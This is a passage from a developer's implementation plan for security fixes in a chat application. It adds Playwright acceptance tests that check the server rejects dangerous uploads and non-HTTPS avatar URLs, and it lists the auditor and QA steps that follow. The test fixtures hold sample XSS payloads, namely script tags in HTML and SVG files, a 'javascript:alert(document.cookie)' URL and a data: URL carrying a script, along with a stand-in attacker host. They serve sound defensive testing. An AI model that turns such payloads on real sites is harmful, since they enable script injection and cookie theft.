git commit -m "test(e2e): add security hardening E2E tests for SEC-01, SEC-03, SEC-05"
```

---

## Task 6: UAT Tests — `10-security-hardening.uat.spec.ts`

**Files:**
- Create: `e2e/tests/uat/10-security-hardening.uat.spec.ts`

UAT (user acceptance) tests read like business-level acceptance criteria. They describe what security properties a real user experiences.

- [ ] **Step 6.1: Create the UAT test file**

Create `e2e/tests/uat/10-security-hardening.uat.spec.ts`:

```typescript
import { test, expect } from '../../fixtures/test-fixtures';

/**
 * UAT: Security Hardening (SEC-01, SEC-03, SEC-05)
 *
 * Acceptance criteria verified here:
 *   AC-01: A logged-in user cannot discover another user's email address
 *          by knowing their username.
 *   AC-03a: Uploading a file with a dangerous MIME type (HTML/JS/SVG) is rejected.
 *   AC-03b: Uploading a file that claims to be an image but contains non-image
 *            bytes is rejected.
 *   AC-05: A user cannot set an avatar URL that uses a non-HTTPS scheme.
 */

test.describe('UAT: Security hardening', () => {

  test('AC-01 — A user cannot retrieve another user email via the public username lookup', async ({ api, userA, userB }) => {
    // Scenario: userA is logged in and knows userB's username (visible in any chat room).
    // userA calls the lookup API. The response must NOT contain userB's email.

    const ctx = await api.authContext(userA.accessToken);
    const res = await ctx.get(`/api/users/by-username/${userB.username}`);
    expect(res.status(), 'lookup should succeed').toBe(200);

    const body = await res.json();
    expect(body, 'response must not leak email').not.toHaveProperty('email');
    expect(body.id).toBe(userB.id);

    await ctx.dispose();
  });

  test('AC-03a — Uploading a script file disguised as any type is blocked by MIME policy', async ({ api, userA }) => {
    // Scenario: an attacker tries to upload a JavaScript file via the chat
    // attachment uploader. The server must reject the upload with a 400.

    const dangerousPayloads = [
      { name: 'xss.html',  mimeType: 'text/html',            content: '<html><script>alert(1)</script></html>' },
      { name: 'steal.js',  mimeType: 'application/javascript', content: 'document.cookie' },
      { name: 'trap.svg',  mimeType: 'image/svg+xml',          content: '<svg><script>alert(1)</script></svg>' },
    ];

    const ctx = await api.authContext(userA.accessToken);

    for (const payload of dangerousPayloads) {
      const res = await ctx.post('/api/files/upload', {
        multipart: {
          file: { name: payload.name, mimeType: payload.mimeType, buffer: Buffer.from(payload.content) },
        },
      });
      expect(res.status(), `${payload.mimeType} must be blocked`).toBe(400);
    }

    await ctx.dispose();
  });

  test('AC-03b — Uploading a file that lies about being an image is rejected', async ({ api, userA }) => {
    // Scenario: attacker uploads a file with "image/jpeg" Content-Type but the
    // file body is actually an HTML page. The server must detect the mismatch and
    // return 400.

    const ctx = await api.authContext(userA.accessToken);

    const res = await ctx.post('/api/files/upload', {
      multipart: {
        file: {
          name: 'definitely-not-malware.jpg',
          mimeType: 'image/jpeg',
          buffer: Buffer.from('<html><script>evil()</script></html>'),
        },
      },
    });
    expect(res.status(), 'server must reject fake image').toBe(400);
    const body = await res.json();
    expect(body.error).toContain('content does not match');

    await ctx.dispose();
  });

  test('AC-05 — A user cannot set an avatar URL with a non-HTTPS scheme', async ({ api, userA }) => {
    // Scenario: a user tries to set their avatar to a data: URL or a javascript:
    // URL in order to inject code into other users' browsers when they see the avatar.
    // All non-HTTPS avatar URLs must be rejected.

    const dangerousUrls = [
      'javascript:alert(document.cookie)',
      'data:text/html,<script>alert(1)</script>',
      'http://tracking.attacker.com/pixel.gif',
    ];

    const ctx = await api.authContext(userA.accessToken);

    for (const url of dangerousUrls) {
      const res = await ctx.patch('/api/users/me', { data: { avatarUrl: url } });
      expect(res.status(), `${url.slice(0, 30)} must be rejected`).toBe(400);
    }

    // A legitimate HTTPS avatar URL must be accepted
    const okRes = await ctx.patch('/api/users/me', {
      data: { avatarUrl: 'https://secure-cdn.example.com/avatar.png' },
    });
    expect(okRes.status(), 'HTTPS URL must be accepted').toBe(200);

    await ctx.dispose();
  });
});
```

- [ ] **Step 6.2: Run UAT tests**

```bash
cd /Users/igorvaskonyan/projects/ai/ai-chat-herder
npx playwright test e2e/tests/uat/10-security-hardening.uat.spec.ts --reporter=list 2>&1 | tail -20
```

Expected: all 4 UAT tests PASS.

- [ ] **Step 6.3: Commit**

```bash
git add e2e/tests/uat/10-security-hardening.uat.spec.ts
git commit -m "test(uat): add security hardening UAT tests (AC-01, AC-03a, AC-03b, AC-05)"
```

---

## Task 7: Auditor Review + QA Sign-off + Development Log

Per the orchestration protocol, after all Builder tasks (1–6) are complete:

### 7a — Auditor Review

The **Auditor** sub-agent reviews the following files:
- `src/ChatHerder.API/Endpoints/UserEndpoints.cs`
- `src/ChatHerder.API/Endpoints/FilesEndpoints.cs`
- `frontend/src/app/shared/utils/inline-markdown.ts`
- `tests/ChatHerder.Unit.Tests/Endpoints/UserEndpointsTests.cs`
- `tests/ChatHerder.Unit.Tests/Endpoints/FilesEndpointsTests.cs`
- `frontend/src/app/shared/utils/inline-markdown.spec.ts`

Review checklist:
- [ ] SEC-01: `GetByUsername` returns `UserSearchResultDto` (no `Email` field)
- [ ] SEC-03: `BlockedMimeTypes` contains all 9 dangerous types; magic-byte check covers JPEG, PNG, GIF, BMP, ICO, WebP
- [ ] SEC-04: `markersToHtml` first calls `escapeHtml(text)` before any regex
- [ ] SEC-05: `PatchMe` rejects non-HTTPS `avatarUrl` with 400
- [ ] No regressions in existing authorization logic (file download, room/dialog access)
- [ ] All new unit tests exercise RED path before implementation (TDD compliance)

### 7b — QA Run

- [ ] **Run full E2E suite**

```bash
cd /Users/igorvaskonyan/projects/ai/ai-chat-herder
npx playwright test --reporter=list 2>&1 | tail -40
```

Expected: all existing + new tests PASS (no regressions).

- [ ] **Run full unit suite**

```bash
dotnet test ChatHerder.sln 2>&1 | tail -10
```

Expected: all tests pass.

### 7c — Development Log Entry

After both sub-agents approve, append a T206 entry to `DEVELOPMENT_LOG.md` with `[Security]` prefix covering all five fixes and both test suites. (Builder writes this, format as per existing entries.)

---

## Self-Review Checklist

- [x] SEC-01 fix covered: unit test (RED→GREEN) + E2E + UAT
- [x] SEC-02 covered: noted in SECURITY.md as a DevOps/config action; no code change required — no test needed beyond the existing WebSocket connection tests
- [x] SEC-03 fix covered: unit tests for blocked types + magic-byte mismatch + valid PNG/JPEG + E2E + UAT
- [x] SEC-04 fix covered: unit tests prove XSS payload blocked, implementation adds one line
- [x] SEC-05 fix covered: unit tests for javascript/data/http/https + E2E + UAT
- [x] All `Internal` static helpers exposed for unit testing
- [x] No placeholder steps — every step has actual code or commands
- [x] Existing tests must remain green (checked in steps 1.6, 2.5, 3.5)
- [x] Orchestration steps (Auditor + QA) defined in Task 7
